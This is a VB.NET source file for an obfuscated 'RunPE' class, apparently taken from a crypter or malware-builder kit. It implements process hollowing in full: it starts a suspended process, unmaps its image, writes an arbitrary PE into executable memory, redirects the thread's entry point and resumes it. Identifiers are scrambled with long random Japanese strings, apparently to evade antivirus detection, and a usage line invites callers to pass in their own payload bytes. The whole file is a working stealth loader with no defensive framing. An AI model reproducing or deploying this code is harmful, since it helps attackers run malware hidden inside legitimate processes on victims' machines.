Imports System.Runtime.InteropServices
Imports System.Text

'-------------------------------------------------------------
' RunPE Writed By : Simon-Benyo

' Working In : 64/32 Bit

' RunPE Generator Writed By : MONSTERMC

' Call RunPE : 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ発桜開花 .桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ発桜 (Your_Byte, Your_String)
'-------------------------------------------------------------

Public Class 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ発桜開花
    <DllImport("kernel32", charset:=CharSet.Auto)> _
    Private Shared Function CreateProcessW(ByVal appName As String, ByVal commandLine As StringBuilder, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, _
            ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtGetContextThread(ByVal hThr As IntPtr, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtUnmapViewOfSection(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtReadVirtualMemory(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSS As Integer, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtResumeThread(ByVal hThread As IntPtr, ByVal SC As IntPtr) As UInteger
    End Function
    <DllImport("ntdll")> _
    Private Shared Function NtSetContextThread(ByVal hThr As IntPtr, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    <DllImport("kernel32")> _
    Private Shared Function VirtualAllocEx(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期 As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
    End Function
    <DllImport("ntdll", SetLastError:=True)> _
    Private Shared Function NtWriteVirtualMemory(ByVal hProcess As IntPtr, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況 As IntPtr, ByVal lpBuffer As Byte(), ByVal nSS As UInteger, ByVal 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ As Integer) As Boolean
    End Function
    Private Shared Function 桜花る状さ(ByVal 桜花る状さ開花 As Long, Optional ByVal 桜花る状さ開花せさ As Long = &H4) As Integer
        Dim 桜花る状さ開花せささ花 As IntPtr
        Dim 桜花る状さ開花せささ花の時 As Integer
        Call NtReadVirtualMemory(Process.GetCurrentProcess.Handle, 桜花る状さ開花, 桜花る状さ開花せささ花, 桜花る状さ開花せさ, 桜花る状さ開花せささ花の時)
        Return 桜花る状さ開花せささ花
    End Function
    Public Function 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ発桜(ByVal 桜花る状さ開花せささ花の時桜発 As Byte(), ByVal 桜花る状さ開花せささ花の時桜発知花 As String) As Boolean
        Try
            Dim 桜花る状さ開花せささ花の時桜発知花表ら As GCHandle = GCHandle.Alloc(桜花る状さ開花せささ花の時桜発, GCHandleType.Pinned) : Dim hModuleBase As Integer = 桜花る状さ開花せささ花の時桜発知花表ら.AddrOfPinnedObject : 桜花る状さ開花せささ花の時桜発知花表ら.Free()
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を As IntPtr = IntPtr.Zero
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開 As IntPtr() = New IntPtr(3) {}
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開 As Byte() = New Byte(67) {}
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ As Integer = BitConverter.ToInt32(桜花る状さ開花せささ花の時桜発, 60)
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の As Integer
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を As UInteger() = New UInteger(178) {}
            桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を(0) = &H10002
            CreateProcessW(Nothing, New StringBuilder(桜花る状さ開花せささ花の時桜発知花), 桜花る状さ開花せささ花の時桜発知花表ら況を, 桜花る状さ開花せささ花の時桜発知花表ら況を, False, 4, 桜花る状さ開花せささ花の時桜発知花表ら況を, Nothing, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開, 桜花る状さ開花せささ花の時桜発知花表ら況を花開)
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ As Integer = (hModuleBase + 桜花る状さ(hModuleBase + &H3C))
            桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の = 桜花る状さ(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ + &H34)
            NtUnmapViewOfSection(桜花る状さ開花せささ花の時桜発知花表ら況を花開(0), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の)
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況 As IntPtr = VirtualAllocEx(桜花る状さ開花せささ花の時桜発知花表ら況を花開(0), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の, 桜花る状さ(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ + &H50), &H3000, &H40)
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開 As New IntPtr(BitConverter.ToInt32(桜花る状さ開花せささ花の時桜発, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ + &H34))
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期 As New IntPtr(BitConverter.ToInt32(桜花る状さ開花せささ花の時桜発, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ + 80))
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時 As Integer
            Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ As Integer
            NtWriteVirtualMemory(桜花る状さ開花せささ花の時桜発知花表ら況を花開(0), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況, 桜花る状さ開花せささ花の時桜発, CUInt(CInt(桜花る状さ(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ + &H54))), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時)
            For i = 0 To 桜花る状さ(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ + &H6, 2) - 1
                Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開 As Integer() = New Integer(9) {}
                Buffer.BlockCopy(桜花る状さ開花せささ花の時桜発, (桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ + &HF8) + (i * 40), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開, 0, 40)
                Dim 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ As Byte() = New Byte((桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開(4) - 1)) {}
                Buffer.BlockCopy(桜花る状さ開花せささ花の時桜発, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開(5), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ, 0, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ.Length)
                桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期 = New IntPtr(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況.ToInt32() + 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開(3))
                桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開 = New IntPtr(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ.Length)
                NtWriteVirtualMemory(桜花る状さ開花せささ花の時桜発知花表ら況を花開(0), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期, 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ発開期さ, CUInt(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ)
            Next i
            NtGetContextThread(桜花る状さ開花せささ花の時桜発知花表ら況を花開(1), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を)
            NtWriteVirtualMemory(桜花る状さ開花せささ花の時桜発知花表ら況を花開(0), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を(41) + &H8, BitConverter.GetBytes(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況.ToInt32()), CUInt(&H4), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ開況花開の期せ時ませ)
            桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を(&H2C) = 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の + 桜花る状さ(桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期をれさ + &H28)
            NtSetContextThread(桜花る状さ開花せささ花の時桜発知花表ら況を花開(1), 桜花る状さ開花せささ花の時桜発知花表ら況を花開時開花さ開の期を)
            NtResumeThread(桜花る状さ開花せささ花の時桜発知花表ら況を花開(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class